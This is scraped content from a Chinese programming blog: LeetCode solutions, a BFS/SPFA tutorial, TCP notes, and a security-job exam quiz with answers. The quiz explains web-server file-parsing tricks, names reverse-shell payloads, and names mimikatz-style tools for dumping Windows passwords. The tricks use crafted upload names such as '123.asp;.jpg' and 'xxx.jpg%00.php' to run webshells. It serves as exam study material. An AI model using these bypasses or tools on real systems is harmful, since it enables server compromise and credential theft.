\u0026lt;\u0026lt; change_a \u0026lt;\u0026lt; \u0026#34; \u0026#34; \u0026lt;\u0026lt; change_b \u0026lt;\u0026lt; endl;  if(bSearch(change_b, B) != -INF) // 找到  { res.push_back(change_a); res.push_back(change_b); break; } } return res; } };  对于一个vector进行二分查找，初始化right = v.size() - 1，第一次WA的时候没有减一；\nwhile循环，判断条件应该是left \u0026lt;= right，第一次WA的时候也没有等号。\n二分还是细啊o(╥﹏╥)o\n 不过表现就烂成蛇皮了。\n\rPerformance 1\r\n双指针 在查找changeA和changeB的时候是否存在O(n) 的办法呢？是存在的。\n假设Allice和Bob的集合都已经从小到大排好序，使用一个pA指向Allice的集合起始元素，pB指向Bob的集合起始元素，用如下规则进行移动：\n 当*pA \u0026gt; *pB + diff / 2的时候，pB++； 当*pA \u0026lt; *pB + diff / 2的时候，pA++； 两者相等的时候，就是我们要的答案。  此法的正确性主要来自于集合的有序性。第一种情况出现时，说明pB指向的元素太小了，changeB需要再大一点，故将pB向后移动；当第二种情况出现的时候，说明pA指向的元素太小了，changeA需要再大一点。\n二分和双指针法的最大复杂度其实都是O(nlogn)（排序），但是在查找过程中显然双指针更快一些。\nAC代码： class Solution { public: typedef long long LL; vector\u0026lt;int\u0026gt; fairCandySwap(vector\u0026lt;int\u0026gt;\u0026amp; A, vector\u0026lt;int\u0026gt;\u0026amp; B) { sort(A.begin(), A.end()); sort(B.begin(), B.end()); LL sum_a = 0; LL sum_b = 0; for (int i = 0; i \u0026lt; A.size(); ++i) sum_a += A[i]; for (int i = 0; i \u0026lt; B.size(); ++i) sum_b += B[i]; LL diff = sum_a - sum_b; vector\u0026lt;int\u0026gt; res; vector\u0026lt;int\u0026gt;::iterator pA = A.begin(); vector\u0026lt;int\u0026gt;::iterator pB = B.begin(); while (pA != A.end() \u0026amp;\u0026amp; pB != B.end()) { if (*pA \u0026gt; *pB + diff / 2) // pB指向的目标太小  { pB++; } else if (*pA \u0026lt; *pB + diff / 2) // pA指向的目标太小  { pA++; } else { res.push_back(*pA); res.push_back(*pB); break; } } return res; } }; 表现还不错。\n\rPerformance 2\r\n官方题解中提到的哈希表，在最开始构思的时候就想到了，但是懒得再查STL的用法，故放弃。\n题解中有个老哥与我的双指针方法一毛一样，但是我的做法是独立想出来的，故不将其放入参考资料中。\n参考资料 [1] 力扣官方题解.公平的糖果交换[EB/OL].2021-02-01\nhttps://leetcode-cn.com/problems/fair-candy-swap/solution/gong-ping-de-tang-guo-jiao-huan-by-leetc-tlam/\n","date":"2021-02-01T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E9%94%99%E9%A2%98%E6%9C%AC-leetcode888.-%E5%85%AC%E5%B9%B3%E7%9A%84%E7%B3%96%E6%9E%9C%E6%A3%92%E4%BA%A4%E6%8D%A2/","title":"错题本 | LeetCode888. 公平的糖果棒交换"},{"content":"我的第一次LeetCode周赛，本来大有希望AC三道题，结果在这个神坑上趴了半个多小时o(╥﹏╥)o\n题目链接：https://leetcode-cn.com/problems/can-you-eat-your-favorite-candy-on-your-favorite-day/\n题目  给你一个下标从 0 开始的正整数数组 candiesCount ，其中 candiesCount[i] 表示你拥有的第 i 类糖果的数目。同时给你一个二维数组 queries ，其中 queries[i] = [favoriteTypei, favoriteDayi, dailyCapi] 。\n你按照如下规则进行一场游戏：\n 你从第 0 天开始吃糖果。 你在吃完 所有 第 i - 1 类糖果之前，不能 吃任何一颗第 i 类糖果。 在吃完所有糖果之前，你必须每天 至少 吃 一颗 糖果。  请你构建一个布尔型数组 answer ，满足 answer.length == queries.length 。answer[i] 为 true 的条件是：在每天吃 不超过 dailyCapi 颗糖果的前提下，你可以在第 favoriteDayi 天吃到第favoriteTypei类糖果；否则 answer[i] 为 false 。注意，只要满足上面 3 条规则中的第二条规则，你就可以在同一天吃不同类型的糖果。\n请你返回得到的数组 answer 。\n示例1\n  输入：candiesCount = [7,4,5,3,8], queries = [[0,2,2],[4,2,4],[2,13,1000000000]]\n  输出：[true,false,true]\n  示例2\n  输入：candiesCount = [5,2,6,4,1], queries = [[3,1,2],[4,10,3],[3,10,100],[4,100,30],[1,3,1]]\n  输出：[false,true,true,false,false]\n  数据范围\n 1 \u0026lt;= candiesCount.length \u0026lt;= 105 1 \u0026lt;= candiesCount[i] \u0026lt;= 105 1 \u0026lt;= queries.length \u0026lt;= 105 queries[i].length == 3 0 \u0026lt;= favoriteTypei \u0026lt; candiesCount.length 0 \u0026lt;= favoriteDayi \u0026lt;= 109 1 \u0026lt;= dailyCapi \u0026lt;= 109   分析  弯弯绕绕的规则，实际上就是在问：从头开始吃，能不能在第favDay天吃到favType这种糖果。\n由于从第0天开始吃，所以在favDay这一天的时候，前面一共也已经吃了favDay天。\n这么多天里，最多能吃掉多少糖果，最少能吃掉多少糖果呢？非常简单：\n  每个query里面给出了每天最多能吃多少糖果，我的程序中记做dayCap；\n  每天敞开了吃，不算favDay这一天，最多吃掉favDat * dayCap的糖果，算上这一天结束，能吃掉(favDay + 1) * dayCap的糖果；\n  每天省着吃，但是规定至少需要吃掉一颗。不算favDay这一天，最少也得吃掉favDay的糖果。\n  由于从前往后吃，所以在favDay这一天能不能吃到favType这类糖果，就转化为了favType之前的所有糖果的数量和与上面这两个数值的关系。吃不到糖果只有两种可能，太多与太少：\n 当我们敞开了吃，结果在favDay这一天结束的时候都没办法吃到第favType类糖果，这是由于它前面类型的糖果数量太多了； 当我们省着吃，结果在favDay这一天之前就已经把favType类糖果吃完了，这是由于它前面类型的糖果数量太少了；  使用前缀和数组保存favType之前的糖果数量和，prefix_sum[i]表示第i类糖果之前的糖果和（不包括第i类）。\n AC代码 class Solution: def canEat(self, candiesCount: List[int], queries: List[List[int]]) -\u0026gt; List[bool]: res = [] prefix_sum = [0] for i in range(1, len(candiesCount) + 1): prefix_sum.append(prefix_sum[-1] + candiesCount[i - 1]) # print(len(prefix_sum)) for q in queries: favType = q[0] favDay = q[1] dayCap = q[2] # 敞开了吃，都不能在favDay结束的时候把前面的糖果吃完 # 这里需要算上favDay，一共吃favDay + 1天 if (favDay + 1) * dayCap \u0026lt;= prefix_sum[favType]: res.append(False) continue # 省着吃，在favDay之前就已经把favType吃完 if favDay \u0026gt;= prefix_sum[favType + 1]: res.append(False) continue res.append(True) return res class Solution { public: typedef long long LL; vector\u0026lt;bool\u0026gt; canEat(vector\u0026lt;int\u0026gt;\u0026amp; candiesCount, vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt;\u0026amp; queries) { LL prefix_sum[100010] = { 0 }; // prefix_sum[i]: candiesCount[0]加到candiesCount[i - 1]  bool check = false; for (int i = 1; i \u0026lt;= candiesCount.size(); ++i) { prefix_sum[i] = prefix_sum[i - 1] + candiesCount[i - 1]; // cout \u0026lt;\u0026lt; \u0026#34;i = \u0026#34; \u0026lt;\u0026lt; i \u0026lt;\u0026lt; \u0026#34;: \u0026#34; \u0026lt;\u0026lt; prefix_sum[i] \u0026lt;\u0026lt; \u0026#34; \u0026#34;;  } LL favDay, favType, dayCap; vector\u0026lt;bool\u0026gt; res; for (auto t : queries) { favDay = t[1]; favType = t[0]; dayCap = t[2]; // 第favDay之前，一共吃了favDay天  // 每天开足马力吃，都吃不完前面的  // prefix_sum[favType] = candiesCount[0] 加到 candiesCount[favType - 1]  // 即开始吃favType之前的糖果总和  if ((favDay + 1) * dayCap \u0026lt;= prefix_sum[favType]) { res.push_back(false); continue; } // 每天省着吃，都吃不够  if (favDay \u0026gt;= prefix_sum[favType + 1]) { res.push_back(false); continue; } res.push_back(true); } return res; } };  数据层面，我看讨论区讲的最多的是int存不下的坑，其实这道题从看到数据的第一眼开始就应该选择使用long或long long，大佬们的低级错误啊~\n然后是从第0天开始吃的问题，加粗也拯救不了眼瞎\u0026hellip;\n之前WA了几次，还是逻辑上的错误，没有考虑到favDay这一天也是能吃的，所以最大数量少算了一天；就这还能过61/62，测试数据有点弱。\n关键测试组：\nInput:  [46,5,47,48,43,34,15,26,11,25,41,47,15,25,16,50,32,42,32,21,36,34,50,45,46,15,46,38,50,12,3,26,26,16,23,1,4,48,47,\n32,47,16,33,23,38,2,19,50,6,19,29,3,27,12,6,22,33,28,7,10,12,8,13,24,21,38,43,26,35,18,34,3,14,48,50,34,38,4,50,26,\n5,35,11,2,35,9,11,31,36,20,21,37,18,34,34,10,21,8,5]\n[[85,54,42]]\n Output:  true\n  ","date":"2021-01-31T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E9%9A%BE%E9%A2%98%E6%9C%AC-leetcode5667.-%E4%BD%A0%E8%83%BD%E5%9C%A8%E4%BD%A0%E6%9C%80%E5%96%9C%E6%AC%A2%E7%9A%84%E9%82%A3%E5%A4%A9%E5%90%83%E5%88%B0%E4%BD%A0%E6%9C%80%E5%96%9C%E6%AC%A2%E7%9A%84%E7%B3%96%E6%9E%9C%E5%90%97/","title":"难题本 | LeetCode5667. 你能在你最喜欢的那天吃到你最喜欢的糖果吗？"},{"content":"题目链接：https://leetcode-cn.com/problems/swim-in-rising-water/\n又是一道不错的复习题，借此回顾回顾BFS和SPFA。\nBFS Breadth First Search，宽度优先搜素。\n已知图G = (V, E)和一个源顶点s，宽度优先搜索以一种系统的方式探寻G的边，从而“发现”s所能到达的所有顶点，并计算s到所有这些点的距离（最少边数）。\n使用一个数组visited维护每个顶点先前是否被访问过；使用一个数组dist维护源点到每个顶点的距离。visited初始化为全0，dist初始化为全正无穷。\n使用一个队列q维护当前正在访问的点，每次从队首中取出head来进行操作。对于head的邻接点tmp，若我们之前没有访问过它，则源点到它的距离就是源点到head的距离加1。我们记dist[tmp] = dist[head] + 1，然后将tmp放入队列q中，之后的某个时刻，tmp会被取出，然后继续找出与它邻接且没被访问过的点，直到队列为空，所有可达的点都被访问过了。\nBFS搜索的方法就像那荡开的涟漪，从源点开始不断向外扩张，最终遍历结束，涟漪消散。\n使用当年蹭HDU数据结构课的一道作业来进行BFS的回顾：\n 题目描述\n一个迷宫由R行C列格子组成，有的格子里有障碍物，不能走；有的格子是空地，可以走。 给定一个迷宫，求从左上角走到右下角最少需要走多少步(数据保证一定能走到)。只能在水平方向或垂直方向走，不能斜着走。\n输入格式\n第一行是两个整数，Ｒ和Ｃ，代表迷宫的长和宽。（ 1\u0026lt;= R，C \u0026lt;= 40) 接下来是Ｒ行，每行Ｃ个字符，代表整个迷宫。 空地格子用'.\u0026lsquo;表示，有障碍物的格子用\u0026rsquo;#\u0026lsquo;表示。 迷宫左上角和右下角都是\u0026rsquo;.'。\n输出格式\n输出从左上角走到右下角至少要经过多少步（即至少要经过多少个空地格子）。计算步数要包括终点,，不包括起点。如果不能到达右下角，输出“NO”.\n输入1：\n5 5\n..###\n#\u0026hellip;.\n#.#.#\n#.#.#\n#.#..\n输出1： 8\n 这是一道宽搜模板题。从源点出发，向四个方向（上下左右）探寻邻接点，若邻接点合法（即没有越界）且该点不是障碍（'#'）且该点未被访问，则记录它到源点的距离。\n我一直不会证明宽搜的正确性，总觉得它理所当然，就直接放代码了：\n#include \u0026lt;queue\u0026gt;#include \u0026lt;iostream\u0026gt;#include \u0026lt;algorithm\u0026gt;#include \u0026lt;vector\u0026gt; using namespace std; typedef struct { int x, y; } Point; char graph[44][44]; int visited[44][44]; int dist[44][44]; int R, C; queue\u0026lt;Point\u0026gt; q; vector\u0026lt;pair\u0026lt;int, int\u0026gt;\u0026gt; dirs = { {0, 1}, {1, 0}, {0, -1}, {-1, 0} }; void bfs() { Point head; Point tmp; // 源点入队 \ttmp.x = tmp.y = 0; visited[0][0] = 1; dist[0][0] = 0; q.push(tmp); // 开始宽搜 \twhile (!q.empty()) { head = q.front(); q.pop(); for (const auto [dirx, diry] : dirs) { tmp.x = head.x + dirx; tmp.y = head.y + diry; if ( 0 \u0026lt;= tmp.x \u0026amp;\u0026amp; tmp.x \u0026lt; R \u0026amp;\u0026amp; 0 \u0026lt;= tmp.y \u0026amp;\u0026amp; tmp.y \u0026lt; C \u0026amp;\u0026amp; graph[tmp.x][tmp.y] != \u0026#39;#\u0026#39; \u0026amp;\u0026amp; !visited[tmp.x][tmp.y] ) { dist[tmp.x][tmp.y] = dist[head.x][head.y] + 1; visited[tmp.x][tmp.y] = 1; q.push(tmp); } } } } int main() { cin \u0026gt;\u0026gt; R \u0026gt;\u0026gt; C; for (int i = 0; i \u0026lt; R; ++i) { for (int j = 0; j \u0026lt; C; ++j) { cin \u0026gt;\u0026gt; graph[i][j]; dist[i][j] = 0xffff; } } bfs(); if (dist[R - 1][C - 1] != 0xffff) { cout \u0026lt;\u0026lt; dist[R - 1][C - 1] \u0026lt;\u0026lt; endl; } else { cout \u0026lt;\u0026lt; \u0026#34;NO\\n\u0026#34;; } return 0; } SPFA 终于来到了正题。\nSPFA是求单源最短路径的一种算法，其思想与宽搜十分相近。实际上，我当年在完全没有接触此算法的情况下独立地将宽搜改写为了一个粗糙的SPFA，用它通过了一些求最短路的题目。由此可见，在理解宽搜的前提下理解SPFA是比较简单的。\n大概还是需要讨论讨论BFS的正确性：我们将当前节点的邻接节点加入队列，由于当前节点到源节点最短，则其邻接节点到源节点也最短。\n但是，BFS的“距离”实际上是指源节点到当前节点的“跳数”，也就是从源节点出发需要经过几个节点才能到达当前节点。这在一个带权图中是不适用的。考虑以下情况：\n\rBFS在带权图中不适用\r\n我们从源点A出发，到达点E，使用BFS时，情况如下：\n  队列初始只有点A，dist[B] ~ dist[E]都是正无穷，visited[B] ~ visited[E]都是0； 点A出队，考虑其所有邻接点B、C、D，设置dist[B] = 5; dist[C] = 3; dist[D] = 7，并逐一入队，现在队列中有B/C/D； 点B出队，考虑其所有邻接点E，设置dist[E] = dist[B] + edge[B][E] = 11;，将E入队，现在队列中有C/D/E； 点C出队，考虑其所有邻接点E，由于visited[E] = 1，不再进行更新； 点D出队，没有邻接点； 点E出队，没有邻接点； 结束。   可以看到，由BFS最短跳数得到的带权距离并不一定是最短的，而这主要是由于边权具备任意性。实际上，例如在计算机网络中进行路由选路时，路由跳数最少的那条路线也未必是时延最低的，与此例有异曲同工之妙。\n在上面的分析中，由visited带来的影响能否消除呢？答案是肯定的。既然可能出现跳数更多但权和更短的路径，那么我们在访问点E的时候考虑其dist[E]和dist[C] + edge[C][E]的大小，令其等于更小的那一个不就可以了吗？\n在本例中，这样做确实可以。当点C出队时考虑其邻接点E，由于dist[E] \u0026gt; dist[C] + edge[C][E]，我们将dist[E]的值更新为后者，即A到E的最短距离为7。\n但是，在一个更加复杂的图中，这样做就不完全正确了。考虑这个有向图：\n\r有向图\r\n当我们经过了很多跳之后终于找到了一个到达点C的更短路径（A-\u0026gt;B-\u0026gt;D-\u0026gt;F-\u0026gt;G-\u0026gt;C)，发现它的邻接点E早在不知道什么时候就已经用路径A-\u0026gt;C-\u0026gt;E来计算距离了。\n兵来将挡，水来土掩。既然我使用更小的距离来更新某个点时，它的邻接点可能无法得到更新，那么我们干脆让它再次进入队列中，这样之后它从队列中被取出时将会重新更新所有邻接点；同理，被更新的邻接点再次进入队列中，去更新邻接点的邻接点\u0026hellip;\u0026hellip;\n没错，SPFA就是如此，且只有如此。\n回顾一下说了什么：\n 修改BFS中的距离更新条件，不用visited作为判断标准，而用dist作为判断标准，只要dist更小，就对其进行更新； 每次更新了某个点的dist，把它重新入队，这样就能更新它的邻接点。  那么，visited数组就还是有用的：我们之前使用visited来保存访问过的点，BFS过程中遇到访问过的点就不再访问了；现在可以使用visited来保存一个点是否存在队列中，若是，我们更新它的dist的时候就不用入队，因为它本来就在队列里面。采用这个办法，每次一个点出队的时候就将对应的visited设置为0，为其提供再次入队的可能性。\n说了那么多，看看LeetCode778. 水位上升的泳池中游泳:\n 在一个 N x N 的坐标方格 grid 中，每一个方格的值 grid[i][j] 表示在位置(i,j)的平台高度。\n现在开始下雨了。当时间为t时，此时雨水导致水池中任意位置的水位为t。你可以从一个平台游向四周相邻的任意一个平台，但是前提是此时水位必须同时淹没这两个平台。假定你可以瞬间移动无限距离，也就是默认在方格内部游动是不耗时的。当然，在你游泳的时候你必须待在坐标方格里面。\n你从坐标方格的左上平台 (0，0) 出发。最少耗时多久你才能到达坐标方格的右下平台 (N-1, N-1)？\n示例1\n  输入: [[0,2],[1,3]]\n  输出: 3\n  解释: 时间为0时，你位于坐标方格的位置为 (0, 0)。 此时你不能游向任意方向，因为四个相邻方向平台的高度都大于当前时间为 0 时的水位。\n  等时间到达 3 时，你才可以游向平台 (1, 1). 因为此时的水位是 3，坐标方格中的平台没有比水位 3 更高的，所以你可以游向坐标方格中的任意位置\n 这道题可以使用变相的SPFA来解决。我们的dist不再是源点到任一点的距离，而是源点到达任一点所需要的时间。对于一个点的邻接点，如果自己的高度比它高，则说明我们到达当前这个点的时候，水面已经没过了这个邻接点；如果自己的高度比它低，说明我们到达当前这个点的时候还没办法到达邻接点，因为至少需要等待水面没过它；所以采用当前这条路径，要到达这个邻接点的时间就是max(grid[tmp.x][tmp.y], distance[head.x][head.y])。\n那么根据SPFA的逻辑，就能得到如下的代码：\nclass Solution { public: typedef struct { int x, y; } Point; int swimInWater(vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt;\u0026amp; grid) { const int n = grid.size(); int visited[51][51] = { 0 }; int distance[51][51]; vector\u0026lt;pair\u0026lt;int, int\u0026gt;\u0026gt; dirs = {{0, 1}, {0, -1}, {1, 0}, {-1, 0}}; for (int i = 0; i \u0026lt; n; i++) { for (int j = 0; j \u0026lt; n; j++) { distance[i][j] = n * n; } } // SPFA  queue\u0026lt;Point\u0026gt; q; Point head; Point tmp; tmp.x = tmp.y = 0; distance[0][0] = grid[0][0]; q.push(tmp); visited[0][0] = 1; while (!q.empty()) { head = q.front(); q.pop(); visited[head.x][head.y] = 0; // 提供再次入队的可能性  for (const auto [dirx, diry] : dirs) // 对于所有邻接点  { tmp.x = head.x + dirx; tmp.y = head.y + diry; if ( (0 \u0026lt;= tmp.x \u0026amp;\u0026amp; tmp.x \u0026lt; n) \u0026amp;\u0026amp; (0 \u0026lt;= tmp.y \u0026amp;\u0026amp; tmp.y \u0026lt; n) \u0026amp;\u0026amp; distance[tmp.x][tmp.y] \u0026gt; max(grid[tmp.x][tmp.y], distance[head.x][head.y]) ) { distance[tmp.x][tmp.y] = max(grid[tmp.x][tmp.y], distance[head.x][head.y]); if (!visited[tmp.x][tmp.y]) { q.push(tmp); visited[tmp.x][tmp.y] = 1; } } } } return distance[n - 1][n - 1]; } }; 表现一般，主要是由于SPFA算法在稀疏图的情况下表现更好，在这种稠密图中时间复杂度退化了。\n\rPerformance\r\n这题实际上还是使用Dijkstra算法会好一些，官方还提供了二分答案（思路简单！）、并查集等骚操作，不在本文的讨论范围内。\n参考资料 [1] 力扣官方题解.水位上升的泳池中游泳[EB/OL].2021-01-30\nhttps://leetcode-cn.com/problems/swim-in-rising-water/solution/shui-wei-shang-sheng-de-yong-chi-zhong-y-xm9i/\n[2] SHHHS.SPFA算法[EB/OL].2016-09-14\nhttps://www.cnblogs.com/shadowland/p/5870640.html\n[3] 360百科.宽度优先搜索[EB/OL]\nhttps://baike.so.com/doc/7806949-8081044.html\n","date":"2021-01-30T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E9%9A%BE%E9%A2%98%E6%9C%AC-leetcode778.-%E6%B0%B4%E4%BD%8D%E4%B8%8A%E5%8D%87%E7%9A%84%E6%B3%B3%E6%B1%A0%E4%B8%AD%E6%B8%B8%E6%B3%B3/","title":"难题本 | LeetCode778. 水位上升的泳池中游泳"},{"content":"  \u0026quot;安全岗笔试题——1\u0026quot;  近期准备安全岗实习的笔试，结果悲伤地证实了我的知识体系中还是存在很多漏洞，在此对我不够熟悉的题目进行记录。\n以下哪些说法是正确的？（）\nA、 iOS系统从iOS6开始引入kernel ASLR安全措施\nB、 主流的iPhone手机内置了AES和RSA硬件加速解密引擎\nC、 安卓系统采用了安全引导链（Secureboot Chain），而iOS系统则未采用\nD、 Android4.1 系统默认启用了内存ASLR\n 答案  ABD  iOS系统也采用了安全引导链，C错误   以下哪个工具可以用来运行DDoS攻击？（）\nA、 菜刀\nB、 WSI\nC、 Dosend\nD、 Chkrootkit\n 答案  C  中国菜刀是一款专业的网站管理软件； WSI是PHP注入工具，具体可以参考这篇文章； Dosend是一款Linux发包工具，可以用来实现DDoS攻击； chkrootkit是用来检查rootkit的。   以下哪些服务器曾被发现文件解析漏洞？（）\nA、 Apache\nB、 IIS\nC、 nginx\nD、 squid\n 答案  ABC  A、Apache解析漏洞：该服务器从右到左判断解析文件，如果为不可识别解析，就继续往左判断。如shell.php.owf.rar，其中.owf和.rar是Apache不可解析的，就将此文件最终解析为shell.php  B、IIS解析漏洞：一是IIS5.x/6.0中，网站下建立名为.asp/.asa的文件夹，其内的任何文件都被当成asp文件解析并执行；二是123.asp;.jpg会被解析为123.asp。  C、nginx解析漏洞：一是nginx默认Fast-CGI开启的情况下，黑客上传名为upupimage.jpg，内容为PHP代码的文件，然后访问upupimage.jpg/.php，在这个目录下就会生成一句话木马shell.php；二是在图片中嵌入PHP代码，然后通过访问xxx.jpg%00.php来执行其中的代码。影响版本0.5,0.6,0.7\u0026lt;=0.7.65,0.8\u0026lt;=0.0.37。  squid爆出来的更多是拒绝服务攻击。它是一个高效的Web缓存及代理程序，最初是为Unix平台开发的，现在也被移植到Linux和大多数的Unix类系统中，最新的Squid可以运行在Windows平台下。   以下哪几种工具可以对网站进行自动化Web漏洞扫描？（）\nA、 hackbar\nB、 AWVS\nC、 IBM appsacn\nD、 nmap\n 答案  BC  hackbar可以用来快速构建一个HTTP请求、编码解码base64等操作，不能自动化Web漏洞扫描；nmap是一款网络端口扫描工具，可以扫描各种端口及其服务甚至是系统漏洞检测。从它的NSE脚本可以看到它也可以进行Web漏洞扫描，但是需要复杂的配置命令，故不能自动化扫描。   黑客控制一台Windows服务器，发现IE浏览器使用了代理，可以访问外网，执行如下命令发现：\nC:\\Users\\test\u0026gt;ping www.baidu.com -n 1 正在 Pingwww.a.shifen.com [14.215.177.38] 具有32字节的数据： 请求超时\nC:\\Users\\test\u0026gt;telnet www.baidu.com 80 正在链接www.baidu.com…无法打开到主机的连接。 在端口 80: 连接失败。\n 通过如上信息判断，一下哪些反弹shell操作会失败\nA、 Windows/meterpreter/reverse_http\nB、 icmp协议的后门\nC、 windows/meterpreter/reverse_https\nD、 windows/meterpreter.reverse_tcp\n 答案  ABCD  IE浏览器使用了代理，可能HTTP协议会受到防火墙限制，故A不对；ping不通百度说明ICMP协议也受影响。故http、https、icmp协议的反弹shell都会失败，D也是不对的，对方挂了代理，telnet不通，只有通过插入挂了代理的IE进程反弹，或者通过代理反弹.   以下哪些工具可以抓取Windows明文密码？（）\nA、 WCE\nB、 minikatz\nC、 Quarks PWdump\nD、 CAIN\n 答案  AB  A、WCE是与gethashes和mimikatz齐名的一款hash管理工具，使用wce进行本地和域的hash注入，可以在高权限下获取明文密码  B、法国一个牛B的人写的轻量级调试器，可以帮助安全测试人员抓取Windows密码。mimikatz 2.0版本，抓密码命令更加简单了，新功能还包括能够通过获取的kerberos登录凭据，绕过支持RestrictedAdmin模式的win8或win2012svr的远程终端(RDP)的登陆认证  C、一个Win32环境下的系统授权信息导出工具，目前除此之外没有任何一款工具可以导出如此全面的信息，支持这么多的OS版本，且相当稳定。  D、CAIN主要用于网络数据嗅探，也带有密码破解功能，但是不能抓取windows明文密码   iOS平台上常见的Hook框架有（）\nA、 Xposed\nB、 Intent Fuzz\nC、 Drozer\nD、 Substrate\n 答案  D  A/ 这个是android的hook框架，有不少开发者发布了不错的框架。  B/ 这个是android 应用组件模糊测试框架  C/ 这个是android 综合渗透测试平台  D/ IOS平台的hook的框架。此外，Cydia Substrate是android上的强大而实用的HOOK工具   执行nmap 10.5.5.1默认会扫描以下哪个端口（）\nA、 21\nB、 3389\nC、 8080\nD、 1024\n 答案  AC  nmap默认扫描选项是对常规端口和服务进行探测。其中常规端口是1000个最可能开放的端口。   【判断】TCP和UDP相比，TCP传送数据更安全（）\n 答案  错。可靠传输不等于更加安全，两者实际上不存在哪个更安全的对比。    题目来源 [1] daxi0ng.腾讯2016实习招聘-安全岗笔试题答案详细解释[EB/OL].2019-03-13\nhttps://blog.csdn.net/qq_40989258/article/details/88532712\n\u0026nbsp;\n ","date":"2021-01-29T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E5%AE%89%E5%85%A8%E5%B2%97%E7%AC%94%E8%AF%95%E9%A2%981/","title":"安全岗笔试题——1"},{"content":"传输层 传输层的功能\n从通信和信息处理的角度看，传输层向它上面的应用层提供通信服务，它属于面向通信部分的最高层，同时也是用户功能中的最低层。\n实际上，传输层起到一个承上启下的作用。它之下的网络层、数据链路层、物理层被称为通信子网，其实现细节对用户是不可见的。\n传输层的功能如下：\n 提供进程之间的逻辑通信（即端到端的通信）。进程间的逻辑通信是指本主机上运行的某个进程和对方主机上运行的某个进程进行通信。而与此相对的，网络层提供的是点到点的通信，指的是本主机与对方主机的通信。 复用和分用。多个进程可以使用同一个传输层协议封装自己的数据，而对方主机可以使用同样的协议正确解析这些数据，交付给正确的应用进程。 差错检测。传输层检测首部和数据部分的差错，而网络层只检查IP数据报的首部，不检查数据部分是否出错。 提供两种不同的传输协议，即面向连接的TCP和无连接的UDP。网络层无法同时实现两种协议（即要么使用面向连接的服务，如虚电路；要么只提供无连接的服务，如数据报）。  需要注意，在计算机网络层次结构中，网络层被认为是不可靠的服务，即网络层传输的数据可能出现丢失、混乱或重复，这些不可靠的问题需要由传输层来考虑解决。\n端口的概念\n网络层的数据交付是点到点的，也就是主机到主机的交付。当一个IP数据报到达了主机，如何判断这份数据报应该交给哪个进程呢？传输层引入了端口，每个进程与一个端口号绑定。主机把IP数据报解封，就能看到里面的传输层数据包，其包头中写明了目的端口，只需要把数据交付给对应于这个端口的进程即可。\n结合IP和端口，就能唯一地标识一台主机上的一个进程，这就是Socket（套接字）：\n套接字 = （主机IP地址， 端口号）\nTCP  TCP协议的特点\n TCP是在不可靠的IP层之上实现的可靠的数据传输协议，它主要针对之前提及的网络层数据传输的丢失、混乱或重复问题，实现传输层上的可靠、有序、无丢失和不重复。\nTCP的主要特点如下：\n 面向连接。 每条连接只能有两个端点，即一对一的。 可靠的交付服务，保证数据无差错、不丢失、不重复且有序。 全双工通信，即任何时刻双方都能进行数据的发送。为此，双方都应该设置发送缓存和接收缓存，用来临时存放双向通信的数据。 面向字节流。计算机网络中常见的一个问题是：面向字节和面向报文有什么区别？ 面向字节流是指TCP将应用程序交付下来的数据仅视为一连串的无结构的字节流，发送的时候按照TCP的规则进行发送，不会考虑保留原始数据的边界；而面向报文是指每次发送的数据作为一个报文，一个报文是一块有结构的数据。   TCP报文段\n 想要理解TCP的连接建立等等细节，认识其报头是必要的。TCP有固定的20B报头，变长字段配合填充字段使TCP报头长度始终是4B的整数倍。由于首部长度字段只有4位，故报头最长为15 * 4 = 60B\nTCP报头格式如下：\n\rTCP Header\r\n每个字段的含义可以参见这篇文章。\n TCP连接管理\n TCP是面向连接的协议，每个TCP连接都有三个阶段：连接建立、数据传输和连接释放。TCP的连接管理就是使运输连接的建立和释放都能正常进行。\nTCP连接的端口称为套接字（socket）或插口。连接采用C/S方式，主动发起连接的进程称为客户机（Client），被动等待连接的进程称为服务器（Server）。\n连接的建立分为3个步骤，即三次握手：\n\rTCP three-way-handshake\r\n 第一步：客户机向服务器发送一个报文段，该报文段不含应用层数据，首部中的SYN标志被置为1，且该报文段占用了一个随机序号seq=x。 第二步：服务器收到连接请求，如同意连接，就向客户机发回确认，并为该连接分配TCP缓存和变量。确认报文中SYN和ACK都置为1，seq是服务器选用的初始随机序号，ack表示期望收到的下一个客户机报文序号。 第三步：客户机接收到确认报文，也要为该连接分配缓存和变量，并回复确认。  完成三次握手之后，双方的应用进程在任何时刻都可以发送数据（全双工）。\n注意这里的第二步握手，服务器在此步分配资源，那么如果客户端不回应第三步的确认报文，则服务器在原地忙等，过一段时间后才删除这些资源；如果快速发送大量的SYN包给特定服务器，将耗尽它的资源，使得正常的连接无法被建立，这就是典型的SYN Flood攻击。\n 三次握手的必要性：\n进行三次握手是必要的。\n从直觉进行理解：第一步握手是客户端向服务器发送数据，此时双方对信道的性质还不了解；第二步握手成功之后，客户端知道了服务器能够收到自己的数据，但服务器还不知道客户端能不能收到自己的数据；第三步握手成功之后，服务器知道客户端能收到自己的数据，可以开始通信。\n进一步地，考虑以下这种两次握手的情况：\n\rTCP 2-way-handshake-bug1\r\n在第二步握手时，服务器回应的报文段没有被客户机收到，而此时服务器认为连接已经建立（因为对服务器来说第二步握手已经完成了），开始发送数据；服务器发送的数据到达客户机，但客户机并不知道自己的连接已经建立，这里的seq字段是违法的，丢弃这些包；服务器超时重传，客户端继续丢弃。\n当然，对于客户机来说，连接迟迟无法建立，应当重新发送SYN包，而对于服务器来说，与这个客户端的连接已经存在了，故对后来的连接请求不予响应。\n 不妨再考虑下面这种情况：\n\rTCP 2-way-handshake-bug2\r\n当客户机发送一个SYN包，该请求在网络中某个节点长时间滞留，客户机超时之后认为报文丢失，重传一次请求，服务器收到之后建立连接，开始传输数据。\n数据传输完毕之后双方断开连接，而此时，前一个滞留在网络中的连接请求到达服务器，服务器认为客户机又请求建立连接。此时，如果使用两次握手，服务器认为连接建立，而客户机实际上并没有发起连接请求，因此不予理睬，造成了服务器资源的浪费。\n 数据传输完成之后，需要断开连接。如果你有注意到上图中的FIN报文段，需要留心，那只是个断开连接的示意，其中并没有展现“四次挥手”的过程。\n而真正的“四次挥手”过程如下图：\n\rTCP 四次挥手\r\n 